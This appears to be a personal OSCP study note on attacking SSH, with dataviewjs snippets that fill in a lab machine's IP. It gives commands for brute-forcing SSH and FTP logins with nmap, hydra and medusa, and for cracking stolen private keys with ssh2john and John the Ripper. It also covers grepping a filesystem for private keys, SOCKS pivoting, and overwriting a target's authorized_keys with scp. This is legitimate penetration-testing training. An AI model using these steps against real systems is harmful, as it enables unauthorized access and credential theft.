nmap -p 22 --script ssh-brute \
  --script-args userdb=/usr/share/wordlists/metasploit/namelist.txt,passdb=/usr/share/wordlists/rockyou.txt \
  192.168.X.X
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `nmap -p 22 --script ssh-brute --script-args userdb=/usr/share/wordlists/metasploit/namelist.txt,passdb=/usr/share/wordlists/rockyou.txt ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```

- `id_rsa` is the private key that should be kept secret and never shared
    
- `id_rsa.pub` is the public key that can be shared with other systems

These keys work together like a lock and key. The public key (`id_rsa.pub`) is installed on remote machines you want to connect to, while the private key (`id_rsa`) on your local machine proves your identity. Now, let’s download the private key and exit the FTP connection.
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ssh [USER]@${ip} -p [portno]`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
gedit id_rsa
```

```
sudo chmod 600 id_rsa
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ssh -i id_rsa [user]@${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
If encrypted with a passphrase,

use ssh2john to convert the key into a crackable hash format and then John the Ripper with the rockyou.txt wordlist. 

```
ssh2john id_rsa >> ssh.hash
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

---

Look through foreign systems for authorized_keys

Likely file locations

```
/home/user/.ssh/authorized_keys
```

SSH Private Key

```
/home/user/.ssh/id_ed25519
```

---

port forward our connection to the remote host's internal port
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ssh -D 9090 [user]@${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
We will also need to configure a SOCKS proxy in the foxy-proxy browser extension in order to make the
browser route the traffic through the port which is forwarded.

![[Pasted image 20260319201941.png]]

Proxy Type : SOCKS5
IP Address : 127.0.0.1
Port : 9090

Visit

```
http://127.0.0.1:80/
```

---


uname -r 
	shows kernal release

Hunting for SSH keys

```
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```

download files

```
scp username@remote_host:/path/to/remote/file /path/to/local/destination
```

LOCAL SSH to FTP bruteforce

```
medusa -U /home/satwossh/username-anarchy/thomas_smith_usernames.txt \
       -P passwords.txt \
       -h 127.0.0.1 \
       -M ftp \
       -n 21

```


hydra

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `hydra -l [user] -P /usr/share/wordlists/rockyou.txt ssh://${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```


---

[[Reaching internal hidden SSH ports]]

---

BEING RESTRICTED in AUTHORIZED USERS AND TRYING TO OVERWRITE THAT FILE IN TARGET MACHINE USING SCP

We can see where the ‘ACCESS DENIED’ message is coming from but here’s the trick. We _have_ the SSH key and because of that, we _are_ able to use secure copy (scp). So we _should_ be able to over write the authorized_keys file.

I am going to remove the restrictive preamble of the authorized_keys file and try to overwrite the original.
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `scp -i id_rsa authorized_keys max@${ip}:/home/max/.ssh/authorized_keys`;

dv.paragraph("```bash\n" + command + "\n```");
```
if error try
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `scp -O -i id_rsa authorized_keys max@${ip}:/home/max/.ssh/authorized_keys`;

dv.paragraph("```bash\n" + command + "\n```");
```
